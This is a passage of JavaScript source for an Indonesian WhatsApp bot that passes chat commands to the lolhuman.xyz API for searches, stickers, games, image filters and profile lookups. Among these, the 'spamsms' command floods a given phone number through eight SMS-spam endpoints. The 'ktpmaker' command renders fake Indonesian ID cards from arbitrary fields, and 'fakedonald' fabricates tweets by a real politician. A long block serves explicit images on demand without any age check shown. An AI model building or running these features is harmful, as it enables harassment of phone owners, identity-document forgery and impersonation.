                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'playstore':
                    if (args.length == 0) return reply(`Example: ${prefix + command} telegram`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/playstore?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Play Store Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.title}\n`
                        ini_txt += `ID : ${x.appId}\n`
                        ini_txt += `Developer : ${x.developer}\n`
                        ini_txt += `Link : ${x.url}\n`
                        ini_txt += `Price : ${x.priceText}\n`
                        ini_txt += `Price : ${x.price}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'shopee':
                    if (args.length == 0) return reply(`Example: ${prefix + command} tas gendong`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/shopee?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Shopee Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Name : ${x.name}\n`
                        ini_txt += `Terjual : ${x.sold}\n`
                        ini_txt += `Stock : ${x.stock}\n`
                        ini_txt += `Lokasi : ${x.shop_loc}\n`
                        ini_txt += `Link : ${x.link_produk}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'google':
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'stickerwa':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${apikey}&img=${x}`)
                        await syaa.sendMessage(from, ini_buffer, sticker)
                    }
                    break

                    // Primbon
                case 'artinama':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_nama = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/artinama?apikey=${apikey}&nama=${ini_nama}`)
                    reply(get_result.result)
                    break
                case 'jodoh':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu & Bacem`)
                    ini_nama = args.join(" ").split("&")
                    nama1 = ini_nama[0].trim()
                    nama2 = ini_nama[1].trim()
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jodoh/${nama1}/${nama2}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Positif : ${get_result.positif}\n`
                    ini_txt += `Negative : ${get_result.negatif}\n`
                    ini_txt += `Deskripsi : ${get_result.deskripsi}`
                    reply(ini_txt)
                    break
                case 'weton':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/weton/${tanggal}/${bulan}/${tahun}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Weton : ${get_result.weton}\n`
                    ini_txt += `Pekerjaan : ${get_result.pekerjaan}\n`
                    ini_txt += `Rejeki : ${get_result.rejeki}\n`
                    ini_txt += `Jodoh : ${get_result.jodoh}`
                    reply(ini_txt)
                    break
                case 'jadian':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 12 12 2020`)
                    tanggal = args[0]
                    bulan = args[1]
                    tahun = args[2]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jadian/${tanggal}/${bulan}/${tahun}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Karakteristik : ${get_result.karakteristik}\n`
                    ini_txt += `Deskripsi : ${get_result.deskripsi}`
                    reply(ini_txt)
                    break
                case 'tebakumur':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_name = args.join(" ")
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebakumur?apikey=SoftApikey&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    break

                    // Entertainment
                case 'asupan':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asupan?apikey=${apikey}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await syaa.sendMessage(from, ini_buffer, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    break
                case 'wancak':
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/onecak?apikey=${apikey}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'sambungkata':
                    if (sambungkata.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    if (args.length == 0) return reply(`Example: ${prefix + command} tahu`)
                    ini_txt = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sambungkata?apikey=${apikey}&text=${ini_txt}`)
                    get_result = get_result.result
                    await syaa.sendMessage(from, get_result, text, { quoted: mek }).then(() => {
                        sambungkata[sender.split('@')[0]] = get_result.toLowerCase()
                        fs.writeFileSync("./database/sambungkata.json", JSON.stringify(sambungkata))
                    })
                    break
                case 'cancelsambungkata':
                    if (!sambungkata.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki tebak gambar sebelumnya")
                    delete sambungkata[sender.split('@')[0]]
                    fs.writeFileSync("./database/sambungkata.json", JSON.stringify(sambungkata))
                    reply("Success mengcancel sambung kata sebelumnya")
                    break
                case 'tebakgambar': // case by piyo-chan
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/tebak/gambar?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_image = get_result.image
                    jawaban = get_result.answer
                    ini_buffer = await getBuffer(ini_image)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek, caption: "Jawab gk? Jawab lahhh, masa enggak. 30 detik cukup kan? gk cukup pulang aja" }).then(() => {
                        tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    })
                    await sleep(30000)
                    if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                        reply("Jawaban: " + jawaban)
                        delete tebakgambar[sender.split('@')[0]]
                        fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    }
                    break
                case 'canceltebakgambar':
                    if (!tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki tebak gambar sebelumnya")
                    delete tebakgambar[sender.split('@')[0]]
                    fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                    reply("Success mengcancel tebak gambar sebelumnya")
                    break

                case 'akinator': // Premium / VIP apikey only
                    if (akinator.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/akinator/start?apikey=${apikey}`)
                    var { server, frontaddr, session, signature, question, step } = get_result.result
                    const data = {}
                    data["server"] = server
                    data["frontaddr"] = frontaddr
                    data["session"] = session
                    data["signature"] = signature
                    data["question"] = question
                    data["step"] = step
                    ini_txt = `${question}\n\n`
                    ini_txt += "0 - Ya\n"
                    ini_txt += "1 - Tidak\n"
                    ini_txt += "2 - Saya Tidak Tau\n"
                    ini_txt += "3 - Mungkin\n"
                    ini_txt += "4 - Mungkin Tidak"
                    await syaa.sendMessage(from, ini_txt, text, { quoted: mek }).then(() => {
                        akinator[sender.split('@')[0]] = data
                        fs.writeFileSync("./database/akinator.json", JSON.stringify(akinator))
                    })
                    break
                case 'cancelakinator':
                    if (!akinator.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki akinator sebelumnya")
                    delete akinator[sender.split('@')[0]]
                    fs.writeFileSync("./database/akinator.json", JSON.stringify(akinator))
                    reply("Success mengcancel akinator sebelumnya")
                    break


                    // Creator
                case 'quotemaker3':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} LoL|Human`)
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ")
                        request({
                            url: `https://api.lolhuman.xyz/api/quotemaker3?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "text": ini_txt
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            syaa.sendMessage(from, ini_buff, image, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'stickerwm':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} LoL|Human`)
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            syaa.sendMessage(from, ini_buff, sticker, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break                
                case 'roundsticker':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.webp')
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/towebpwround?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            syaa.sendMessage(from, ini_buff, sticker, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'stickernobg':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.png')
                        file_name2 = getRandom('.webp')
                        request({
                            url: `https://api.lolhuman.xyz/api/removebg?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ffmpeg(`./${file_name}`)
                                .input(file_name)
                                .on('error', function(err) {
                                    console.log(err)
                                    fs.unlinkSync(file_name)
                                })
                                .on('end', function() {
                                    syaa.sendMessage(from, fs.readFileSync(file_name2), sticker, { quoted: mek })
                                    fs.unlinkSync(file_name2)
                                })
                                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                                .toFormat('webp')
                                .save(file_name2)
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'takestick':
                    if ((isMedia && !mek.message.videoMessage || isQuotedSticker)) {
                        if (args.length == 0) return reply(`Example: ${prefix + command} LoL|Human`)
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".webp")
                        ini_txt = args.join(" ").split("|")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/towebpauthor?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                                "package": ini_txt[0],
                                "author": ini_txt[1]
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            syaa.sendMessage(from, ini_buff, sticker, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Tag sticker yang sudah dikirim`)
                    }
                    break
                case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp':
                case 'attp2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${apikey}&text=${ini_txt}`)
                    await syaa.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    break
                    case 'tahta':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${apikey}&text=${ini_txt}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break                                  
                    case 'cutegravity': 
				reply("Loading.....")
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    txt1 = args[0]
                    txt2 = args[1]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ephoto2/${command}?apikey=${apikey}&text1=${txt1}&text2=${txt2}`)
                    syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break             
                    case 'avatardota':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/avatardota?apikey=${apikey}&text=${ini_txt}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break

                    case 'herobanner':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/lolbanner?apikey=${apikey}&text=${ini_txt}`)  
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                                                                                                                                                                                                                                                
                case 'smoji':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/smoji/${emoji}?apikey=${apikey}`)
                    await syaa.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    break
                case 'smoji2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 😭`)
                    emoji = args[0]
                    try {
                        emoji = encodeURI(emoji[0])
                    } catch {
                        emoji = encodeURI(emoji)
                    }
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/smoji3/${emoji}?apikey=${apikey}`)
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${apikey}&img=` + ini_buffer.result.emoji.whatsapp)
                    await syaa.sendMessage(from, ini_buffer, sticker, { quoted: mek })
                    break
                case 'fakedonald':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/tweettrump?apikey=${apikey}&text=${ini_txt}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'faketoko':
                    await faketoko(teks = "Tahu Bacem", url_image = "https://i.ibb.co/JdfQ73m/photo-2021-02-05-10-13-39.jpg", title = "Iky Ganss", code = "IDR", price = 1000000)
                    break
                case 'ktpmaker':
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|Iky Ganss|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ktpmaker?apikey=${apikey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break

                    // Converter
                case 'togif':
                    if ((isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".mp4")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                            }
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            get_result = JSON.parse(body)
                            getBuffer(get_result.result).then(result => {
                                syaa.sendMessage(from, result, video, { mimetype: Mimetype.gif })
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Reply stickernya kawan`)
                    }
                    break
                case 'tomp4':
                    if ((isQuotedSticker)) {
                        const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        file_name = getRandom(".mp4")
                        request({
                            url: `https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath),
                            }
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            get_result = JSON.parse(body)
                            getBuffer(get_result.result).then(result => {
                                syaa.sendMessage(from, result, video, { mimetype: Mimetype.mp4 })
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Reply stickernya kawan`)
                    }
                    break

                    // Stalk
                case 'stalkig':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jessnolimit`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${apikey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.photo_profile)
                    ini_txt = `Username : ${ini_result.username}\n`
                    ini_txt += `Full Name : ${ini_result.fullname}\n`
                    ini_txt += `Posts : ${ini_result.posts}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Bio : ${ini_result.bio}`
                    syaa.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'stalkgithub':
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL-Human`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${apikey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.avatar)
                    ini_txt = `Name : ${ini_result.name}\n`
                    ini_txt += `Link : ${ini_result.url}\n`
                    ini_txt += `Public Repo : ${ini_result.public_repos}\n`
                    ini_txt += `Public Gists : ${ini_result.public_gists}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Bio : ${ini_result.bio}`
                    syaa.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'stalktwitter':
                    if (args.length == 0) return reply(`Example: ${prefix + command} jokowi`)
                    username = args[0]
                    ini_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${username}?apikey=${apikey}`)
                    ini_result = ini_result.result
                    ini_buffer = await getBuffer(ini_result.profile_picture)
                    ini_txt = `Username : ${ini_result.screen_name}\n`
                    ini_txt += `Name : ${ini_result.name}\n`
                    ini_txt += `Tweet : ${ini_result.tweet}\n`
                    ini_txt += `Joined : ${ini_result.joined}\n`
                    ini_txt += `Followers : ${ini_result.followers}\n`
                    ini_txt += `Following : ${ini_result.following}\n`
                    ini_txt += `Like : ${ini_result.like}\n`
                    ini_txt += `Description : ${ini_result.description}`
                    syaa.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    break
                case 'stalktiktok':
                    if (args.length == 0) return reply(`Example: ${prefix + command} bulansutena`)
                    stalk_toktok = args[0]
                    get_result = await fetchJson(`http://lolhuman.herokuapp.com/api/stalktiktok/${stalk_toktok}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Username : ${get_result.username}\n`
                    ini_txt += `Nickname : ${get_result.nickname}\n`
                    ini_txt += `Followers : ${get_result.followers}\n`
                    ini_txt += `Followings : ${get_result.followings}\n`
                    ini_txt += `Likes : ${get_result.likes}\n`
                    ini_txt += `Video : ${get_result.video}\n`
                    ini_txt += `Bio : ${get_result.bio}\n`
                    pp_tt = await getBuffer(get_result.user_picture)
                    syaa.sendMessage(from, pp_tt, image, { quoted: mek, caption: ini_txt })
                    break

                    // Other
                case 'ssweb':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/ssweb?apikey=${apikey}&url=${ini_link}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'ssweb2':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/sswebfull?apikey=${apikey}&url=${ini_link}`)
                    await syaa.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break
                case 'shortlink':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://api.lolhuman.xyz`)
                    ini_link = args[0]
                    ini_buffer = await fetchJson(`https://api.lolhuman.xyz/api/shortlink?apikey=${apikey}&url=${ini_link}`)
                    reply(ini_buffer.result)
                    break
                case 'spamsms':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                    nomor = args[0]
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=${apikey}&nomor=${nomor}`)
                    await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=${apikey}&nomor=${nomor}`)
                    reply("Success")
                    break

                case '1977':
                case 'aden':
                case 'brannan':
                case 'brooklyn':
                case 'clarendon':
                case 'gingham':
                case 'hudson':
                case 'inkwell':
                case 'earlybird':
                case 'kelvin':
                case 'lark':
                case 'lofi':
                case 'maven':
                case 'mayfair':
                case 'moon':
                case 'nashville':
                case 'perpetua':
                case 'reyes':
                case 'rise':
                case 'slumber':
                case 'stinson':
                case 'toaster':
                case 'valencia':
                case 'walden':
                case 'willow':
                case 'xpro2':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.jpg')
                        request({
                            url: `https://api.lolhuman.xyz/api/filter/${command}?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            syaa.sendMessage(from, ini_buff, image, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
                    }
                    break
                case 'pencil':
                    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                        const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : lol
                        filePath = await lolhuman.downloadAndSaveMediaMessage(encmedia)
                        file_name = getRandom('.jpg')
                        request({
                            url: `https://api.lolhuman.xyz/api/editor/pencil?apikey=${apikey}`,
                            method: 'POST',
                            formData: {
                                "img": fs.createReadStream(filePath)
                            },
                            encoding: "binary"
                        }, async function(error, response, body) {
                            fs.unlinkSync(filePath)
                            fs.writeFileSync(file_name, body, "binary")
                            ini_buff = fs.readFileSync(file_name)
                            await syaa.sendMessage(from, ini_buff, image, { quoted: mek }).then(() => {
                                fs.unlinkSync(file_name)
                            })
                        });
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
                    }
                    break
                    // Random Image //
                case 'art':
                case 'bts':
                case 'exo':
                case 'elf':
                case 'neko':
                case 'waifu':
                case 'shota':
                case 'husbu':
                case 'sagiri':
                case 'shinobu':
                case 'megumin':
                case 'wallnime':
                    getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break
                case 'chiisaihentai':
                case 'trap':
                case 'blowjob':
                case 'yaoi':
                case 'ecchi':
                case 'hentai':
                case 'ahegao':
                case 'hololewd':
                case 'sideoppai':
                case 'animefeets':
                case 'animebooty':
                case 'animethighss':
                case 'hentaiparadise':
                case 'animearmpits':
                case 'hentaifemdom':
                case 'lewdanimegirls':
                case 'biganimetiddies':
                case 'animebellybutton':
                case 'hentai4everyone':
                    await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break
                case 'bj':
                case 'ero':
                case 'cum':
                case 'feet':
                case 'yuri':
                case 'trap':
                case 'lewd':
                case 'feed':
                case 'eron':
                case 'solo':
                case 'gasm':
                case 'poke':
                case 'anal':
                case 'holo':
                case 'tits':
                case 'kuni':
                case 'kiss':
                case 'erok':
                case 'smug':
                case 'baka':
                case 'solog':
                case 'feetg':
                case 'lewdk':
                case 'waifu':
                case 'pussy':
                case 'femdom':
                case 'cuddle':
                case 'hentai':
                case 'eroyuri':
                case 'cum_jpg':
                case 'blowjob':
                case 'erofeet':
                case 'holoero':
                case 'classic':
                case 'erokemo':
                case 'fox_girl':
                case 'futanari':
                case 'lewdkemo':
                case 'wallpaper':
                case 'pussy_jpg':
                case 'kemonomimi':
                case 'nsfw_avatar':
                    getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break

                    // Textprome //
                case 'blackpink':
                case 'greenneon':
                case 'advanceglow':
                case 'futureneon':
                case 'sandwriting':
                case 'sandsummer':
                case 'sandengraved':
                case 'metaldark':
                case 'neonlight':
                case 'holographic':
